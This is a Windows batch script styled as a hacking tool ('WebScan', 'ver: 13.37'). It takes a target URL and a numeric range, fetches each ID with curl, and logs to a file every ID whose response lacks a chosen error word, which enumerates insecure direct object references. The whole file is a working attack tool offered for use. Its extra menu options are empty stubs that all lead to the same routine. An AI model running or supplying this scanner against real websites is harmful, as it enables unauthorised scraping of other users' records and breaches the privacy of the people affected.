@echo off
chcp 65001 >nul 
setlocal enabledelayedexpansion 
:Main
cls
:WebScan
cls
echo  [0;33m╦ ╦┌─┐┌┐ ╔═╗┌─┐┌─┐┌┐┌
echo  ║║║├┤ ├┴┐╚═╗│  ├─┤│││
echo  ╚╩╝└─┘└─┘╚═╝└─┘┴ ┴┘└┘
echo [0;37mby zEus 🤓    ver: 13.37
echo.
set /p targeturl=[40;31m[+] TARGET: [0;37m
echo -----------------------------------------------------------------
echo 🎯 Target Url                ^| [40;32m%targeturl%[0;37m
echo 🚀 Thread                    ^| [40;32m1 [0;37m
echo -----------------------------------------------------------------
echo [1] IDOR
echo [2]
echo [3]
echo -----------------------------------------------------------------
SET /p option=[40;31m[+] OPTION: [0;37m
if %option% == 1 goto :IDOR
if %option% == 2 goto :IDOR
if %option% == 3 goto :IDOR


:IDOR
cls
echo  [0;33m╦ ╦┌─┐┌┐ ╔═╗┌─┐┌─┐┌┐┌
echo  ║║║├┤ ├┴┐╚═╗│  ├─┤│││
echo  ╚╩╝└─┘└─┘╚═╝└─┘┴ ┴┘└┘
echo [0;37mby zEus 🤓    ver: 13.37
echo.
echo -----------------------------------------------------------------
echo 🎯 Target Url                ^| [40;32m%targeturl%[0;37m
echo 🚀 Thread                    ^| [40;32m1 [0;37m
echo ⚙  Option                    ^| [40;32mIDOR [0;37m
echo -----------------------------------------------------------------
SET /p IDORFROM=[40;31m[+] FROM: [0;37m
SET /p IDORTO=[40;31m[+] TO: [0;37m
SET /p IDORBANWORD=[40;31m[+] BANWORD: [0;37m
echo.


Set idorcount=%IDORFROM%
:idorloop
Set /a idorcount+=1

curl -s "%targeturl%%idorcount%" | findstr /C:"%IDORBANWORD%" > nul

if %errorlevel% equ 1 (
echo [+] [40;32m%targeturl%%idorcount% [0;37m
echo %idorcount% >> VALIDIDOR.txt
set /a valididorcount+=1
) else (
echo [-] [40;31m%targeturl%%idorcount% [0;37m
    )

if %idorcount% LEQ %IDORTO% (
    goto :idorloop
)
echo.
echo [40;32mNumber of valid IDORs: %valididorcount% [0;37m
type VALIDIDOR.txt
pause > nul
echo. > VALIDIDOR.txt
goto :Main

